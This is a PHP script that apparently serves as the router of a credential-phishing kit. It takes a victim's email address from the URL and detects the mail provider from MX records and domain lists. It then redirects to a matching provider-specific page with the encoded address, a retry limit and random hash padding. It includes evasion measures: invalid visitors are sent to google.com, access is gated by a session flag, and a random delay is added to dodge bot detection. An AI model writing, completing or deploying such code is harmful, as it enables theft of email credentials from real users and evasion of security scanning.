<?php
session_start(); // Start the session for redirect verification

// Function to generate random strong hash
function generateRandomHash($length = 70) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
    $hash = '';
    for ($i = 0; $i < $length; $i++) {
        $hash .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $hash;
}

// Function to check MX records and determine service
function getServiceFromMX($domain) {
    // Get MX records
    if (!getmxrr($domain, $mxhosts)) {
        return false; // No MX records found
    }

    // Check MX hosts against known patterns
    foreach ($mxhosts as $mx) {
        // Microsoft services
        if (preg_match('/\.outlook\.com$|\.hotmail\.com$|\.live\.com$|\.msn\.com$/i', $mx)) {
            return 'hotmail';
        }
        if (preg_match('/\.mail\.protection\.outlook\.com$/i', $mx)) {
            return 'office';
        }
        // Google services
        if (preg_match('/\.google\.com$|\.googlemail\.com$|\.aspmx.l.google.com$/i', $mx)) {
            return 'gmail';
        }
        // Yahoo services
        //if (preg_match('/\.yahoodns\.net$|\.yahoo\.com$|\.yahoo-inc\.com$/i', $mx)) {
        //    return 'yahoo';
       // }
        // AOL - fixed to return 'aol' instead of 'yahoo'
        if (preg_match('/\.aol\.com$/i', $mx)) {
            return 'aol';
        }
        // Mail.ru
        if (preg_match('/\.mail\.ru$|\.list\.ru$/i', $mx)) {
            return 'mail.ru';
        }
        // Yandex
        if (preg_match('/\.yandex\.net$|\.yandex\.ru$|\.yandex\.com$/i', $mx)) {
            return 'yandex.ru';
        }
        // Naver
        if (preg_match('/\.naver\.com$/i', $mx)) {
            return 'nv';
        }
        // 163 VIP
        if (preg_match('/\.vip\.163\.com$/i', $mx)) {
            return 'vip163';
        }
        // 126 VIP
        if (preg_match('/\.vip\.126\.com$/i', $mx)) {
            return 'vip126';
        }
    }

    return false; // No matches found in MX records
}

// Define domain mappings with priority to VIP domains
$domain_mappings = [
    'vip163' => ['vip163.', 'vip.163.'],
    'vip126' => ['vip126.', 'vip.126.'],
    'vip.sina' => ['vipsina.', 'vip.sina.'],
    'yahoo' => ['yahoo.', 'rocketmail.', 'ymail.'],
    'hotmail' => ['live.', 'outlook.', 'hotmail.', 'msn.'],
    'office' => ['office.','office365.'],
    'aol' => ['aol.'], // Fixed to ensure AOL goes to AOL folder
    '163' => ['163.', '123.'],
    '126' => ['126.'],
    'gmail' => ['gmail.', 'google.'],
    'daum' => ['hanmail.', 'daum.'],
    'mailqq' => ['mailqq.', 'qq.'],
    'nv' => ['naver.'],
    'yeah' => ['yeah.'],
    'comcast' => ['comcast.'],
    'aliyun' => ['aliyun.'],
    '21cn' => ['21cn.'],
    '139' => ['139.'],
    '183' => ['183.'],
    '263' => ['263.'],
    'sohu' => ['sohu.'],
    'sina' => ['sina.'],
    'yandex.ru' => ['yandexru.', 'yandex.ru'],
    'mail.tom' => ['mailtom.', 'mail.tom.'],
    'hinet' => ['hinet.net', 'hinet.com'],
    'mail.ru' => ['mail.ru', 'mailru.'],
    'mail.china' => ['mailchina', 'mail.china']
    // Webmail removed as requested
];

// Max number of allowed tries
$max_try = 3;
$domain_redirect = false;

// Get Base64 userid from URL
$userid = $_GET['userid'] ?? '';

// Validate decoded email
if (empty($userid) || !filter_var($userid, FILTER_VALIDATE_EMAIL)) {
    header("Location: https://www.google.com", true, 302);
    exit;
}

// Extract domain part
$email_parts = explode('@', $userid);
$domain_part = $email_parts[1] ?? '';

// First try to determine service from MX records
$matched_service = getServiceFromMX($domain_part);

// If MX check didn't find a specific service, try domain mapping
if ($matched_service === false) {
    foreach ($domain_mappings as $service => $patterns) {
        foreach ($patterns as $pattern) {
            if (stripos($domain_part, $pattern) !== false) {
                $matched_service = $service;
                break 2;
            }
        }
    }
}

// Default to yt if no match found
if ($matched_service === false) {
    $matched_service = 'yt';
}

// Re-encode email for URL safety
$encoded_userid = base64_encode($userid);

// ✅ Mark session so only redirected users can access
$_SESSION['came_from_index'] = true;

// Generate random hash
$random_hash = generateRandomHash();

// Build redirect URL with dynamic page value
$redirect_url = "$matched_service/?"
    . "lmo={$random_hash}_Product-$random_hash-UserID-$random_hash"
    . "&userid=" . urlencode($encoded_userid)
    . "&maxtry=" . urlencode($max_try)
    . "&domain_redirect=" . urlencode($domain_redirect)
    . "&page=" . urlencode($matched_service);

// Random delay to reduce bot detection
usleep(rand(0, 2000000));

// Redirect
header("Location: $redirect_url", true, 302);
exit;
?>